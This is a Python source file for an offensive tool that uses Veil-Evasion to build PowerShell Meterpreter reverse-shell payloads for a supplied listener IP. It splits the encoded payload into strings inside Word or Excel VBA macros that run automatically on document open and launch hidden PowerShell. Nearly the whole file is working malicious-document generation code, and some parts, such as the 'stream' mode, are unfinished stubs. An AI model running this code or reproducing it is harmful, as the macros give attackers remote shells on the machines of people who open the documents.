#!/usr/bin/python
# -*- coding: utf-8 -*-
# Author  : Matt Lorentzen
# Twitter : @lorentzenman
# Credits to khr0x40sh
# Macroshop was an inspiration for this and I refactored (ie stole) the 'macro_safe.py' code
# Unicorn by David Kennedy was also an inspiration, espcially the popup warning box
# Description : Glues Veil calls and Macroshop code together to get output with switches for output format - ie Word or Excel

import argparse, os, re, sys, subprocess

def banner():
	banner = """
eeeeeee eeeee e   e  eeeee  eeeee e   e  e
8  8  8 8   8 8   8  8   8  8  88 8   8  8
8e 8  8 8eee8 8eee8e 8eee8e 8   8 8e  8  8
88 8  8 88  8 88   8 88   8 8   8 88  8  8
88 8  8 88  8 88   8 88   8 8eee8 88ee8ee8

	"""
	print greentxt(banner)



# ---------------------------------------->
# Create Payloads
# ---------------------------------------->

def veil_payloads(ip, output_dir):
	""" Takes local IP address as LHOST parm and builds Veil payloads """
	veil_script = '/root/tools/attacking/Veil/Veil-Evasion/Veil-Evasion.py'
	# start empty list to hold
	payloads = []
	# appends payloads with nested 3 value list for dynamic parm calling
	payloads.append(["powershell/meterpreter/rev_http",443, "macro_revhttp_80"])
	payloads.append(["powershell/meterpreter/rev_http",443, "macro_revhttp_443"])
	payloads.append(["powershell/meterpreter/rev_https",443,"macro_revhttps_443"])
	# /root/tools/attacking/Veil/Veil-Evasion/./Veil-Evasion.py -p powershell/meterpreter/rev_https -c LHOST=192.168.4.115 LPORT=443
	payload_bat_location = []
	for parms in payloads:
		lhost = ip
		payload = parms[0]
		lport = str(parms[1])
		output = parms[2]
		command = " -p " + payload + " -c LHOST=" + lhost + " LPORT=" + lport + " -o " + output + " --overwrite"
		# this needs to change from payday as I need to parse the output following the command call
		command = veil_script + command
		# list to hold output
		output = []
		# calls the file and creates the powershell batch file
		for line in os.popen(command).read().split():
			output.append(line)
		# now parse output
		for line in output:
			if ".bat" in line:
				payload_bat_location.append((line, parms[2]))
	return payload_bat_location


def vba_download_stream(vba_file):
	""" Takes the argument for vba downloads, specifies a binary, base64 encodes the file, and then writes the macro code """
	print "I'm here"
	print vba_file


# ---------------------------------------->
# Build VBA Code
# ---------------------------------------->

def build_word_vba_output():
	""" Build VBA Output from call for Word """
	top = "Sub Document_Open()\r\n"
 	top = top + "Dim Command As String\r\n"
 	top = top + "Dim str As String\r\n"
 	top = top + "Dim exec As String\r\n"
 	top = top + "\r\n"
 	top = top + "Arch = Environ(\"PROCESSOR_ARCHITECTURE\")\r\n"
 	top = top + "windir = Environ(\"windir\")"
 	top = top + "\r\n"
 	top = top + "If Arch = \"AMD64\" Then\r\n"
 	top = top + "\tCommand = windir + \"\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"\r\n"
 	top = top + "Else\r\n"
 	top = top + "\tCommand = \"powershell.exe\"\r\n"
 	top = top + "End If\r\n"

	return top


def build_excel_vba_output():
	""" Build VBA Output from call for Excel """
	top = "Sub Workbook_Open()\r\n"
 	top = top + "Dim Command As String\r\n"
 	top = top + "Dim str As String\r\n"
 	top = top + "Dim exec As String\r\n"
 	top = top + "\r\n"
 	top = top + "Arch = Environ(\"PROCESSOR_ARCHITECTURE\")\r\n"
 	top = top + "windir = Environ(\"windir\")"
 	top = top + "\r\n"
 	top = top + "If Arch = \"AMD64\" Then\r\n"
 	top = top + "\tCommand = windir + \"\\syswow64\\windowspowershell\\v1.0\\powershell.exe\"\r\n"
 	top = top + "Else\r\n"
 	top = top + "\tCommand = \"powershell.exe\"\r\n"
 	top = top + "End If\r\n"

	return top


def formStr(varstr, instr):
	""" Parse String """
	holder = []
	str1 = ''
	str2 = ''
	str1 = varstr + ' = "' + instr[:54] + '"'
	for i in xrange(54, len(instr), 48):
 		holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
 		str2 = '"\r\n'.join(holder)

 	str2 = str2 + "\""
 	str1 = str1 + "\r\n"+str2
 	return str1


def build_word_vba_stream_output():
	""" Build Macro from base64 encoded payload """
	pass



def build_excel_vba_stream_output():
	""" Build Macro from base64 encoded payload """
	pass



# ---------------------------------------->
# Main Function
# ---------------------------------------->

def Main():
	default_path = '/root/payloads/windows/'
	banner()
	parser = argparse.ArgumentParser(description="Uses Veil to create a powershell reverse connection and then calls macroshop to automatically parse this file")
	parser.add_argument("--ip", help='IP Address for Listener', required=True)
	parser.add_argument("--output", help='Custom output directory for VBA code.')
	parser.add_argument("--filetype", help='Choose the output VBA type <word> <excel>', choices=['word','excel'],required=True)
	parser.add_argument("--mode", choices=['veil','stream'], help='Specifies the tool mode', required=True)
	parser.add_argument("--vba_exe", help='Specifies the path to the binary to base64 encode')
	
	# counts the supplied number of arguments and prints help if they are missing
	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)

	args = parser.parse_args()
	

	ip = args.ip
	filetype = args.filetype

	if args.output:
		output_dir = args.output
	else:
		output_dir = default_path

	# check to see if this is a VBA base64 stream option
	if args.mode == 'stream':
		if not args.vba_exe:
			print redtxt("[!] --vba_exe /path/to/file  is required when using stream option")
		else:
			vba_file = args.vba_exe
			vba_download_stream(vba_file)	
		
	else:
		# First thing is to call Veil
		batch_location = veil_payloads(ip, output_dir)
		for macro in batch_location:
			
			pbl = macro[0]
			payload = macro[1]	

			f = open(pbl, 'r')
			lines = f.readlines()
			f.close()
			cut = []

			for line in lines:
				if "@echo off" not in line:
					first = line.split('else')
					#split on else to truncate the back half
					# split on \"
					cut = first[0].split('\\"', 4)

					#get rid of everything before powershell
					cut[0] = cut[0].split('%==x86')[1]
					cut[0] = cut[0][2:]
		
					#get rid of trailing parenthesis
					cut[2] = cut[2].strip(" ")
					cut[2] = cut[2][:-1]

			#insert '\r\n' and 'str = str +' every 48 chars after the first 54.
			payL = formStr("str", str(cut[1]))
			#double up double quotes, add the rest of the exec string
			idx = cut[0].index('"')	#tells us where IEX is. Now we also have to subtract 10 to remove -Command

			#next our stub for the payload
			cut[0] = cut[0] + "\\\"\" \" & str & \" \\\"\" " + cut[2] +"\""	#deprecated

			#insert 'exec = exec +' and '\r\n' every 48 after the first 54.
			execStr = formStr("exec", str(cut[0]))
			execStr = execStr.replace("\"powershell.exe", "Command + \"")
			execStr = execStr.replace("\"Invoke","\"\"Invoke")
			# ending file
			shell = "Shell exec,vbHide"
			bottom = "End Sub\r\n"
			final = ''
			if args.filetype == "word":
				top = build_word_vba_output()
				final = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"
			else:
				top = build_excel_vba_output()
				final = top + "\r\n" + payL + "\r\n\r\n" + execStr + "\r\n\r\n" + shell + "\r\n\r\n" + bottom + "\r\n"


			# print final
			# now use this final above to write the VBA code out
			output_file = filetype + "_" + payload + "_VBA.txt"
			output_location = output_dir + output_file
			try:
				f = open(output_location,'w')
				f.write(final) # python will convert \n to os.linesep
				f.close()
			except:
				print "Error writing file.\n Please check permissions and try again.\nExiting..."
				sys.exit(1)

			print "File " + yellowtxt(output_file) + " has been written to " + yellowtxt(output_location)



# ---- [ End of Main Function ] ---- #

# ---------------------------------------->
# Helper Functions
# ---------------------------------------->

def redtxt(text2colour):
	redstart = "\033[0;31m"
	redend = "\033[0m"
	return redstart + text2colour + redend

def greentxt(text2colour):
	greenstart = "\033[0;32m"
	greenend = "\033[0m"
	return greenstart + text2colour + greenend

def yellowtxt(text2colour):
	yellowstart = "\033[0;33m"
	yellowend = "\033[0m"
	return yellowstart + text2colour + yellowend

def bluetxt(text2colour):
	bluestart = "\033[0;34m"
	blueend = "\033[0m"
	return bluestart + text2colour + blueend


if __name__ == "__main__":
	Main()
